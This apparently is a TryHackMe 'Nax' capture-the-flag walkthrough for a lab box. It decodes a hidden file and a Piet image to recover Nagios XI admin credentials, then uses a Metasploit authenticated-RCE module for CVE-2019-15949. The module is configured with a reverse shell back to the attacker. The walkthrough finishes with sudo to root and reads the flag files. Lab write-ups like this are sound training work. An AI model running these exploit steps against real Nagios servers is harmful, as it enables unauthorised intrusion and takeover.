# [Nax](https://tryhackme.com/room/nax)

## Identify the critical security flaw in the most powerful and trusted network monitoring software on the market, that allows an user authenticated execute remote code execution.

# Flag

### What hidden file did you find?

1. Begin with network reconnaissance to identify open services

```bash
nmap IP
```

<img width="721" height="216" alt="SCREEN01" src="https://github.com/user-attachments/assets/51eeeed0-3d8e-42c6-8f6c-cc404d632096" />

2. Navigate to `https://<TARGET_IP>` to examine the web application. The page displays a periodic table. Extract the atomic numbers and decode using [CyberChef](https://gchq.github.io/CyberChef/). "From Decimal" operation reveals the hidden file path: `/PI3T.PNg`

```
Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr
47 - 80 - 73 - 51 - 84 - 46 - 80 - 78 - 103
47 80 73 51 84 46 80 78 103
```

<img width="1310" height="740" alt="SCREEN03" src="https://github.com/user-attachments/assets/a0b13e17-25f3-471e-8296-0504994fa1d9" />

---

### Who is the creator of the file?

1. Access the discovered file at `https://<TARGET_IP>/PI3T.PNg` and download it for analysis

2. Analyze the file using strings to extract embedded metadata.

```bash
strings PI3T.PNg
```

<img width="382" height="183" alt="SCREEN04" src="https://github.com/user-attachments/assets/ad098435-8029-4f44-985d-eb8b45d7a12c" />

---

### What is the username you found?

### What is the password you found?

_% is a separator_

1. The PNG file contains a Piet program (esoteric programming language using colors as code). Use an [online Piet interpreter](https://www.bertnase.de/npiet/npiet-execute.php) to execute the hidden program within the image.

   - The Piet program outputs credentials are `nagiosadmin:n3p3UQ&9BjLp4$7uhWdY`

![SCREEN05](https://github.com/user-attachments/assets/d1d151df-9d38-480b-a42d-4cf289ecc1b6)

### What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

1. Log into the Nagios XI interface at `http://<TARGET_IP>/nagiosxi/index.php` using the discovered credentials. The system reports version is `5.5.6`. The relevant CVE can be found at: `https://www.cve.org/CVERecord?id=CVE-2019-15949`

---

### After Metasploit has started, let's search for our target exploit using the command 'search applicationame'. What is the full path (starting with exploit) for the exploitation module?

1. search for our target exploit using the command 'search nagios'.

   - The module is: `exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce`

```bash
msfconsole
search nagios
```

<img width="721" height="432" alt="SCREEN06" src="https://github.com/user-attachments/assets/a7844618-3fe8-4b9b-86a1-93e2d3b13834" />

---

### Compromise the machine and locate user.txt

1. Configure module, and execute it to get user flag

```bash
use exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
show options
set RHOSTS <TARGET_IP>
set USERNAME nagiosadmin
set PASSWORD n3p3UQ&9BjLp4$7uhWdY
set LHOST <YOUR_IP>
set LPORT 4444
exploit

shell

ls /home
ls /home/galand
cat /home/galand/user.txt
```

<img width="342" height="125" alt="SCREEN07" src="https://github.com/user-attachments/assets/61da85dd-7b05-48cc-aaf2-f75231160b19" />

---

### Locate root.txt

1. Escalate privileges to root user

```bash
sudo -l
sudo su -
whoami
cat /root/root.txt
```

<img width="338" height="68" alt="SCREEN08" src="https://github.com/user-attachments/assets/9a48e0b5-df66-42b8-9b7d-556424396361" />
